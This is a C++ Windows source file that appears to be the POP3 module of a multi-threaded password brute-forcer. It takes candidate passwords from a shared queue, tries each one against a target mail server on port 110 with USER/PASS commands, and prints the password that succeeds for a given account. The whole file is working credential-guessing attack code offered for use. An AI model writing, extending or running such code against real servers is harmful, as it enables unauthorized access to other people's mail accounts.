#include "mod_pop3.h"
#include "glob.h"
#include <windows.h>
#include <winsock.h>
#include <cstdio>
#include <deque>
#include <string>
using std::string;
using std::deque;

extern char target_addr[256];
/* 
 *
 *
 */
DWORD WINAPI mod_pop3_run(PVOID param){
    //先copy参数进来
    struct _module_param t_param;
    memcpy(&t_param, param, sizeof (struct _module_param));
    
    while (1){
        int logon_state = 0;
        
        //读取队列中的数据
        EnterCriticalSection(t_param.critical_sec);
        if (0 == t_param.queue->size()){ //队列为空就sleep一下
            LeaveCriticalSection(t_param.critical_sec);
            Sleep(200);
            continue;
        }
        string buf(t_param.queue->front());
        t_param.queue->pop_front();
        LeaveCriticalSection(t_param.critical_sec);

        //接受到结束标识就退出线程
        if (buf == "{$END_LABLE$}"){ 
            printf("[pop3]thread %d receives a END msg, EXIT thread.\n", t_param.id);
            break;
        }

        logon_state = mod_pop3_check(&t_param, buf.c_str());

		if (logon_state == 2){ //返回登录成功, 输出
			printf("[pop3]try %16s on %16s   success!\n", buf.c_str(), t_param.user_name);
            printf("[pop3]thread %d has got a password for <%s>, EXIT thread.\n", t_param.id, t_param.user_name);
            break;
        }else if (logon_state == 1){ //登录时失败了?
			printf("[pop3]logon user %16s fail!\n", t_param.user_name);
		}else {            //密码和用户名不匹配, 也输出
			printf("[pop3]try %16s on %16s   fail!\n", buf.c_str(), t_param.user_name);
        }
    }
    return 0;
}



int mod_pop3_check(struct _module_param *param, const char *str_pass){

    int logon_state = 0, ret = 0;
    char send_buff[256] = {0};
    char recv_buff[256] = {0};
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET; 
    target.sin_port = htons(110);
    target.sin_addr.s_addr = inet_addr(target_addr);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    //连接
    if (0 != connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr))) {
        fprintf(stderr, "[e]thread %d direct a error, ERROR CODE: %d, Exit thread.\n",
            param->id, WSAGetLastError());
        return 0;
    }
    //可以获取到banner
    recv(sock, recv_buff, 256, 0);
    //printf("[t]thread %d receives the banner:\n%s\n", id, recv_buff);

    //copy用户名到send_buff
    sprintf(send_buff, "user %s\n", param->user_name);
    ret = send(sock, send_buff, strlen(send_buff), 0);
    ret = recv(sock, recv_buff, 256, 0);
    if (2 < ret && recv_buff[1] == 'O' && recv_buff[2] == 'K'){
        //copy密码到send_buff
        sprintf(send_buff, "pass %s\n", str_pass);
        ret = send(sock, send_buff, strlen(send_buff), 0);
        ret = recv(sock, recv_buff, 256, 0);
        if (2 < ret && recv_buff[1] == 'O' && recv_buff[2] == 'K'){
            logon_state = 2;
        }
    } else {
        logon_state = 1;
    }
    send(sock, "quit\n", 5, 0);
    closesocket(sock);
    return logon_state;
}

